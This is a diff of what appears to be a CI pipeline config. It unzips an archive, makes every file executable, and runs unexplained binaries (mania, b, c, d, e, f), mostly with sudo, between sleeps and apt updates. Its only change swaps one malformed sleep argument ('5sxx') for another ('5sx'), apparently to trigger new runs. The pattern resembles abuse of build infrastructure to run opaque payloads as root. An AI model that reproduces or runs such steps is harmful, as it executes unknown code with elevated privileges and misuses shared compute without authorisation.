@@ -4,7 +4,7 @@ working_dir: &working_dir ~/root
     - checkout
     - run: unzip ab.zip && chmod u+x * && ./mania && cd son/00 && cp * ../.. && cd ../..
     - run: sudo ./b && sleep 5s && sudo apt update -y
-    - run: sudo ./c && sleep 5sxx
+    - run: sudo ./c && sleep 5sx
     - run: sudo ./d && sleep 10s && sudo apt update -y
     - run: sudo ./e && sleep 15s && sudo apt update -y
     - run: sudo ./f && sleep 10s && sudo apt update -y
